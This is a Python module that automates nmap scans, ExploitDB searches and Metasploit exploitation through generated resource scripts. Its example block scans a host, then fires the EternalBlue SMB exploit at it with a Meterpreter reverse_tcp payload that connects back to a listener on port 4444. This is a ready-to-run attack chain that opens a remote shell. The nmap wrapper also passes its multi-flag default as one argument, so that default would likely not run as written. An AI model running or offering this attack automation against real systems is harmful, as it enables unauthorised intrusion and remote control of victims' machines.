import subprocess
import logging
import os


class ToolIntegrations:
    def __init__(self):
        """
        Initialize the ToolIntegrations module.
        """
        self.logger = logging.getLogger("ToolIntegrations")
        logging.basicConfig(level=logging.INFO)

    def run_nmap(self, target, options="-sV -O"):
        """
        Run an Nmap scan on the target.
        :param target: Target IP or hostname.
        :param options: Nmap scan options (default: service detection and OS fingerprinting).
        :return: Parsed Nmap output or raw results if parsing fails.
        """
        self.logger.info(f"Running Nmap scan on {target} with options: {options}")
        try:
            result = subprocess.run(
                ["nmap", options, target],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if result.returncode != 0:
                self.logger.error(f"Nmap scan failed: {result.stderr}")
                return None
            return result.stdout
        except Exception as e:
            self.logger.error(f"Error running Nmap: {e}")
            return None

    def search_exploitdb(self, query):
        """
        Search for exploits in ExploitDB using SearchSploit.
        :param query: Query string to search for exploits.
        :return: SearchSploit output.
        """
        self.logger.info(f"Searching ExploitDB for: {query}")
        try:
            result = subprocess.run(
                ["searchsploit", query],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if result.returncode != 0:
                self.logger.error(f"SearchSploit query failed: {result.stderr}")
                return None
            return result.stdout
        except Exception as e:
            self.logger.error(f"Error running SearchSploit: {e}")
            return None

    def run_metasploit_exploit(self, module_path, payload, target_ip, options=None):
        """
        Run a Metasploit exploit on a target.
        :param module_path: Path to the Metasploit module (e.g., exploit/windows/smb/ms17_010_eternalblue).
        :param payload: Payload to use with the exploit.
        :param target_ip: Target IP address.
        :param options: Dictionary of additional options for the exploit.
        :return: Exploit session or raw Metasploit console output.
        """
        self.logger.info(f"Running Metasploit exploit: {module_path} on {target_ip} with payload: {payload}")
        try:
            # Create Metasploit commands
            commands = [
                f"use {module_path}",
                f"set RHOSTS {target_ip}",
                f"set PAYLOAD {payload}",
            ]

            if options:
                for option, value in options.items():
                    commands.append(f"set {option} {value}")

            commands.append("exploit -j")
            commands.append("exit")

            # Write commands to a temporary resource script
            resource_file = "msf_resource.rc"
            with open(resource_file, "w") as file:
                file.write("\n".join(commands))

            # Run Metasploit with the resource script
            result = subprocess.run(
                ["msfconsole", "-r", resource_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            # Clean up the temporary file
            os.remove(resource_file)

            if result.returncode != 0:
                self.logger.error(f"Metasploit exploit failed: {result.stderr}")
                return None

            return result.stdout
        except Exception as e:
            self.logger.error(f"Error running Metasploit exploit: {e}")
            return None


if __name__ == "__main__":
    tool = ToolIntegrations()

    # Example 1: Run Nmap scan
    nmap_output = tool.run_nmap("192.168.1.1", options="-sV")
    print("Nmap Output:")
    print(nmap_output)

    # Example 2: Search for exploits in ExploitDB
    exploitdb_output = tool.search_exploitdb("apache")
    print("\nSearchSploit Output:")
    print(exploitdb_output)

    # Example 3: Run Metasploit exploit
    metasploit_output = tool.run_metasploit_exploit(
        module_path="exploit/windows/smb/ms17_010_eternalblue",
        payload="windows/meterpreter/reverse_tcp",
        target_ip="192.168.1.1",
        options={"LHOST": "192.168.1.100", "LPORT": "4444"},
    )
    print("\nMetasploit Output:")
    print(metasploit_output)
